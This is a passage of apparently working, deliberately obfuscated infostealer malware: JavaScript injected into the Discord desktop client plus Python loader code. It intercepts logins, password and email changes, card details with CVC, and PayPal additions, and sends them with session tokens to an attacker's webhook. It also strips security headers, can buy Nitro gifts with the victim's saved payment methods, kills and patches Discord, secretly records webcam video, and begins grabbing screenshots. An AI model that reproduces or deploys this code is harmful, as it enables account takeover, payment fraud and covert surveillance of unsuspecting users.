    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK_HERE%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '[CARD] ';
          break;
        case 2:
          billing += '[PAYPAL] ';
          break;
      }
    }
  });
  if (!billing) billing = 'None';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Login] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Password Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${json.email}\`\`\``,
            inline: false,
          },
          {
            name: ':unlock: Old Password:',
            value: `\`\`\`${oldpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':key: New Password:',
            value: `\`\`\`${newpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Email Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: New Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Paypal Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Card Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':identification_card: Card:',
            value: `\`\`\`Number: ${number}\nCVC: ${cvc}\nExpir Month: ${expir_month}\nExpir Year: ${expir_year}\`\`\``,
            inline: false,
          },
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Nitro Bought] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':rocket: Nitro Code:',
            value: `\`\`\`${code}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');"""

def Di5c0rd_inj3c710n():
    import os
    import re
    import subprocess
    import psutil

    def g3t_c0r3(DFRQJUOWOWIEITGZZTDSIURHGNJTDGEULELITMWHECGACVXVXQCYDYIBPQAGCZNURLILJTMUGBSJJEZDKTGTBYNZPVJ):
        for v4r_file in os.listdir(DFRQJUOWOWIEITGZZTDSIURHGNJTDGEULELITMWHECGACVXVXQCYDYIBPQAGCZNURLILJTMUGBSJJEZDKTGTBYNZPVJ):
            if re.search(r'app-+?', v4r_file):
                v4r_modules = DFRQJUOWOWIEITGZZTDSIURHGNJTDGEULELITMWHECGACVXVXQCYDYIBPQAGCZNURLILJTMUGBSJJEZDKTGTBYNZPVJ + '\\' + v4r_file + '\\modules'
                if not os.path.exists(v4r_modules):
                    continue
                for v4r_file in os.listdir(v4r_modules):
                    if re.search(r'discord_desktop_core-+?', v4r_file):
                        v4r_core = v4r_modules + '\\' + v4r_file + '\\' + 'discord_desktop_core'
                        return v4r_core, v4r_file
        return None

    def st4rt_d15c0rd(DFRQJUOWOWIEITGZZTDSIURHGNJTDGEULELITMWHECGACVXVXQCYDYIBPQAGCZNURLILJTMUGBSJJEZDKTGTBYNZPVJ):
        v4r_update = DFRQJUOWOWIEITGZZTDSIURHGNJTDGEULELITMWHECGACVXVXQCYDYIBPQAGCZNURLILJTMUGBSJJEZDKTGTBYNZPVJ + '\\Update.exe'
        v4r_executable = DFRQJUOWOWIEITGZZTDSIURHGNJTDGEULELITMWHECGACVXVXQCYDYIBPQAGCZNURLILJTMUGBSJJEZDKTGTBYNZPVJ.split('\\')[-1] + '.exe'

        for v4r_file in os.listdir(DFRQJUOWOWIEITGZZTDSIURHGNJTDGEULELITMWHECGACVXVXQCYDYIBPQAGCZNURLILJTMUGBSJJEZDKTGTBYNZPVJ):
            if re.search(r'app-+?', v4r_file):
                v4r_app = DFRQJUOWOWIEITGZZTDSIURHGNJTDGEULELITMWHECGACVXVXQCYDYIBPQAGCZNURLILJTMUGBSJJEZDKTGTBYNZPVJ + '\\' + v4r_file
                if os.path.exists(v4r_app + '\\' + 'modules'):
                    for v4r_file in os.listdir(v4r_app):
                        if v4r_file == v4r_executable:
                            v4r_executable = v4r_app + '\\' + v4r_executable
                            subprocess.call([v4r_update, '--processStart', v4r_executable],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def inj3ct_c0d3():
        FZSCMOTUOXWAFZTCZGWCFCJNUFVUDDNUOLNSIJWKEHNFPYGEQHCNCSBMKRAPCKTQ = os.getenv('LOCALAPPDATA')
        WLIERSONHEHWCEHFHIBRJIJPYKEDOUCSCELLNGOACTOKSWKBDKLWPUDRZKDYOKFIZRCPHLUYDOPABMEJSH = [
            FZSCMOTUOXWAFZTCZGWCFCJNUFVUDDNUOLNSIJWKEHNFPYGEQHCNCSBMKRAPCKTQ + '\\Discord',
            FZSCMOTUOXWAFZTCZGWCFCJNUFVUDDNUOLNSIJWKEHNFPYGEQHCNCSBMKRAPCKTQ + '\\DiscordCanary',
            FZSCMOTUOXWAFZTCZGWCFCJNUFVUDDNUOLNSIJWKEHNFPYGEQHCNCSBMKRAPCKTQ + '\\DiscordPTB',
            FZSCMOTUOXWAFZTCZGWCFCJNUFVUDDNUOLNSIJWKEHNFPYGEQHCNCSBMKRAPCKTQ + '\\DiscordDevelopment'
        ]
        BDBKYGMVSXYFBOBXIBOZLPOCFKPYHZWGJOYOZNSPHXGHRJLWFJRJDXNXCEGBLGRUVRKT = CMKUOETNSZIFLMSBVKWQPEWORWYTBWJCHEYSIEFYAPHCTXASPWBWBOMUEQMFPKLRIUHEDLWDZBTY

        for v4r_proc in psutil.process_iter():
            if 'discord' in v4r_proc.name().lower():
                v4r_proc.kill()

        for DFRQJUOWOWIEITGZZTDSIURHGNJTDGEULELITMWHECGACVXVXQCYDYIBPQAGCZNURLILJTMUGBSJJEZDKTGTBYNZPVJ in WLIERSONHEHWCEHFHIBRJIJPYKEDOUCSCELLNGOACTOKSWKBDKLWPUDRZKDYOKFIZRCPHLUYDOPABMEJSH:
            if not os.path.exists(DFRQJUOWOWIEITGZZTDSIURHGNJTDGEULELITMWHECGACVXVXQCYDYIBPQAGCZNURLILJTMUGBSJJEZDKTGTBYNZPVJ):
                continue

            LAKQAQUBQVPFBDLURNGKCWDBDPAAWUVVTPQJHVJCZLZJPDUSHXWVUSKDNBHRIZTXX = g3t_c0r3(DFRQJUOWOWIEITGZZTDSIURHGNJTDGEULELITMWHECGACVXVXQCYDYIBPQAGCZNURLILJTMUGBSJJEZDKTGTBYNZPVJ)
            if LAKQAQUBQVPFBDLURNGKCWDBDPAAWUVVTPQJHVJCZLZJPDUSHXWVUSKDNBHRIZTXX is not None:
                v4r_core, v4r_core_file = LAKQAQUBQVPFBDLURNGKCWDBDPAAWUVVTPQJHVJCZLZJPDUSHXWVUSKDNBHRIZTXX
                
                DNUDUVWBRPVXKTTINYEGQMWKMYYMZWMVURUFKIYXGSVQALLAWTQJVZZYVNSLNKVEGZUGDZKYREPSVMJNUNUOMHEOTMJLVTXZ = v4r_core + '\\index.js'
                
                if not os.path.exists(DNUDUVWBRPVXKTTINYEGQMWKMYYMZWMVURUFKIYXGSVQALLAWTQJVZZYVNSLNKVEGZUGDZKYREPSVMJNUNUOMHEOTMJLVTXZ):
                    open(DNUDUVWBRPVXKTTINYEGQMWKMYYMZWMVURUFKIYXGSVQALLAWTQJVZZYVNSLNKVEGZUGDZKYREPSVMJNUNUOMHEOTMJLVTXZ, 'w').close()

                with open(DNUDUVWBRPVXKTTINYEGQMWKMYYMZWMVURUFKIYXGSVQALLAWTQJVZZYVNSLNKVEGZUGDZKYREPSVMJNUNUOMHEOTMJLVTXZ, 'w', encoding='utf-8') as f:
                    f.write((BDBKYGMVSXYFBOBXIBOZLPOCFKPYHZWGJOYOZNSPHXGHRJLWFJRJDXNXCEGBLGRUVRKT).replace('discord_desktop_core-1', v4r_core_file)
                            .replace(r"%WEBHOOK_HERE%", KYWRKCWTNYORVMKYODCDUCGZRBRRVKCOPUZXBPTUYZQXMHLNOXIRFBJTFTJZYXLIEWUUAF)
                            .replace(r"%EMBED_COLOR%", str(UNOJDNHEAGYTOMXWQKLCRQRKXEJGNXBSZSEMJYENYNIBOLJFVTFWFUXPOCZBXKVTZZBNPHZYPQ))
                            .replace(r"%USERNAME%", WTIYHAKDXEVXXVAAXMFENAIACISDJHAADPAKNOVZGBDLHEJRXDRSMATTHVUZXXBNDVLPLQMWTNFMQZNZ)
                            .replace(r"%IP_PUBLIC%", ITZONLUPHVTTZUHXNLJBCSEIHBQABMKCHMBDLIFDKDVHDLUVBRQJNMWJQUKHULMGXBS)
                            .replace(r"%EMBED_NAME%", NKLPZURQIDGDUWYJSAKOWUZGLVZXGZSKCTGHMBPUYWTMBUGKIYYIXOBVXIKF)
                            .replace(r"%EMBED_ICON%", GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD)
                            .replace(r"%FOOTER_TEXT%", CCSVHPAVPVWFHDMNWIECAIKJKTEBVENVWINJUCIWZLBDPZILRQYSGFRURVFU)
                            .replace(r"%WEBSITE%", EPOOTFAQFFJQMFYYFNAFSASQFDBNUUEECLXRJCNTCAXKFWPCFSBVPLUCMCYSJMA))
                st4rt_d15c0rd(DFRQJUOWOWIEITGZZTDSIURHGNJTDGEULELITMWHECGACVXVXQCYDYIBPQAGCZNURLILJTMUGBSJJEZDKTGTBYNZPVJ)
    inj3ct_c0d3()

def C4m3r4_C4ptur3():
    import os
    import cv2
    from discord import SyncWebhook, Embed, File
    from datetime import datetime

    try:
        from datetime import datetime
        VQZGUOICLHROFTNCDXPXEQAYVLNDJLZSUMRMLRDOMBNLIAKKMREKUZOJEREEZR_file_capture = f"CameraCapture_{WTIYHAKDXEVXXVAAXMFENAIACISDJHAADPAKNOVZGBDLHEJRXDRSMATTHVUZXXBNDVLPLQMWTNFMQZNZ}.avi"
        MAZCXYMROKQONIHXYVZFCXADYJYWGUPHRWFWWVTNFNEUCTHQTHCDMBGLWWLSGIQVNZZTSJSXUPJIIWZTWBFEPICZHSIWOB = 10
        YGRSPLITLXNRXTPHMYYZTAPYYWXNZAWUOOSPLRXUEBTQFCAJACXDHSCOCQRLR = cv2.VideoCapture(0)

        if not YGRSPLITLXNRXTPHMYYZTAPYYWXNZAWUOOSPLRXUEBTQFCAJACXDHSCOCQRLR.isOpened():
            Clear()
            CTBOBCCKPJZKBEIWPYOETWWMSUVZNAVJZOLCSNWFVSDIPMHJBEPXHVPPZUWQUEQFLDIKNOGRE = SyncWebhook.from_url(KYWRKCWTNYORVMKYODCDUCGZRBRRVKCOPUZXBPTUYZQXMHLNOXIRFBJTFTJZYXLIEWUUAF)
            NAXWOFLVWWSGQAPJVXFXEAWLTCBERBZPXIXEKIWQRYOIGICVKMWTZMSVISEWEV = Embed(
                title=f'Camera Capture `{WTIYHAKDXEVXXVAAXMFENAIACISDJHAADPAKNOVZGBDLHEJRXDRSMATTHVUZXXBNDVLPLQMWTNFMQZNZ} "{ITZONLUPHVTTZUHXNLJBCSEIHBQABMKCHMBDLIFDKDVHDLUVBRQJNMWJQUKHULMGXBS}"`:', 
                description=f"No camera found.",
                color=UNOJDNHEAGYTOMXWQKLCRQRKXEJGNXBSZSEMJYENYNIBOLJFVTFWFUXPOCZBXKVTZZBNPHZYPQ)
            NAXWOFLVWWSGQAPJVXFXEAWLTCBERBZPXIXEKIWQRYOIGICVKMWTZMSVISEWEV.set_footer(text=CCSVHPAVPVWFHDMNWIECAIKJKTEBVENVWINJUCIWZLBDPZILRQYSGFRURVFU, icon_url=GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD)
            CTBOBCCKPJZKBEIWPYOETWWMSUVZNAVJZOLCSNWFVSDIPMHJBEPXHVPPZUWQUEQFLDIKNOGRE.send(embed=NAXWOFLVWWSGQAPJVXFXEAWLTCBERBZPXIXEKIWQRYOIGICVKMWTZMSVISEWEV, username=NKLPZURQIDGDUWYJSAKOWUZGLVZXGZSKCTGHMBPUYWTMBUGKIYYIXOBVXIKF, avatar_url=GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD)
            return

        def c4ptur3(LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR_file_capture):
            v4r_fourcc = cv2.VideoWriter_fourcc(*'XVID')
            v4r_out = cv2.VideoWriter(LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR_file_capture, v4r_fourcc, 20.0, (640, 480))
            v4r_time_start = datetime.now()
            Clear()
            while (datetime.now() - v4r_time_start).seconds < MAZCXYMROKQONIHXYVZFCXADYJYWGUPHRWFWWVTNFNEUCTHQTHCDMBGLWWLSGIQVNZZTSJSXUPJIIWZTWBFEPICZHSIWOB:
                Clear()
                v4r_ret, v4r_frame = YGRSPLITLXNRXTPHMYYZTAPYYWXNZAWUOOSPLRXUEBTQFCAJACXDHSCOCQRLR.read()
                if not v4r_ret:
                    Clear()
                    break
                v4r_out.write(v4r_frame)

            YGRSPLITLXNRXTPHMYYZTAPYYWXNZAWUOOSPLRXUEBTQFCAJACXDHSCOCQRLR.release()
            v4r_out.release()
            Clear()

        try:
            LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR_file_capture = f"{os.path.join(os.environ.get('USERPROFILE'), 'Documents')}\\{VQZGUOICLHROFTNCDXPXEQAYVLNDJLZSUMRMLRDOMBNLIAKKMREKUZOJEREEZR_file_capture}"
            c4ptur3(LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR_file_capture)
        except:
            LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR_file_capture = VQZGUOICLHROFTNCDXPXEQAYVLNDJLZSUMRMLRDOMBNLIAKKMREKUZOJEREEZR_file_capture
            c4ptur3(LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR_file_capture)

        NAXWOFLVWWSGQAPJVXFXEAWLTCBERBZPXIXEKIWQRYOIGICVKMWTZMSVISEWEV = Embed(title=f"Camera Capture `{WTIYHAKDXEVXXVAAXMFENAIACISDJHAADPAKNOVZGBDLHEJRXDRSMATTHVUZXXBNDVLPLQMWTNFMQZNZ} \"{ITZONLUPHVTTZUHXNLJBCSEIHBQABMKCHMBDLIFDKDVHDLUVBRQJNMWJQUKHULMGXBS}\"`:", color=UNOJDNHEAGYTOMXWQKLCRQRKXEJGNXBSZSEMJYENYNIBOLJFVTFWFUXPOCZBXKVTZZBNPHZYPQ, description=f"```└── 📷 - {VQZGUOICLHROFTNCDXPXEQAYVLNDJLZSUMRMLRDOMBNLIAKKMREKUZOJEREEZR_file_capture}```")
        NAXWOFLVWWSGQAPJVXFXEAWLTCBERBZPXIXEKIWQRYOIGICVKMWTZMSVISEWEV.set_footer(text=CCSVHPAVPVWFHDMNWIECAIKJKTEBVENVWINJUCIWZLBDPZILRQYSGFRURVFU, icon_url=GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD)

        CTBOBCCKPJZKBEIWPYOETWWMSUVZNAVJZOLCSNWFVSDIPMHJBEPXHVPPZUWQUEQFLDIKNOGRE = SyncWebhook.from_url(KYWRKCWTNYORVMKYODCDUCGZRBRRVKCOPUZXBPTUYZQXMHLNOXIRFBJTFTJZYXLIEWUUAF)
        with open(LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR_file_capture, "rb") as f:
            CTBOBCCKPJZKBEIWPYOETWWMSUVZNAVJZOLCSNWFVSDIPMHJBEPXHVPPZUWQUEQFLDIKNOGRE.send(
                embed=NAXWOFLVWWSGQAPJVXFXEAWLTCBERBZPXIXEKIWQRYOIGICVKMWTZMSVISEWEV,
                file=File(f, filename=VQZGUOICLHROFTNCDXPXEQAYVLNDJLZSUMRMLRDOMBNLIAKKMREKUZOJEREEZR_file_capture),
                username=NKLPZURQIDGDUWYJSAKOWUZGLVZXGZSKCTGHMBPUYWTMBUGKIYYIXOBVXIKF,
                avatar_url=GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD
            )
            
        if os.path.exists(LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR_file_capture):
            os.remove(LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR_file_capture)
        Clear()
    except:
        Clear()
        pass

def Scr33n5h0t():
    import os
    from PIL import ImageGrab
    from discord import SyncWebhook, Embed, File

    try:
        VQZGUOICLHROFTNCDXPXEQAYVLNDJLZSUMRMLRDOMBNLIAKKMREKUZOJEREEZR_file_screen = f"Screenshot_{WTIYHAKDXEVXXVAAXMFENAIACISDJHAADPAKNOVZGBDLHEJRXDRSMATTHVUZXXBNDVLPLQMWTNFMQZNZ}.png"

        def capture(LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR):
            v4r_image = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
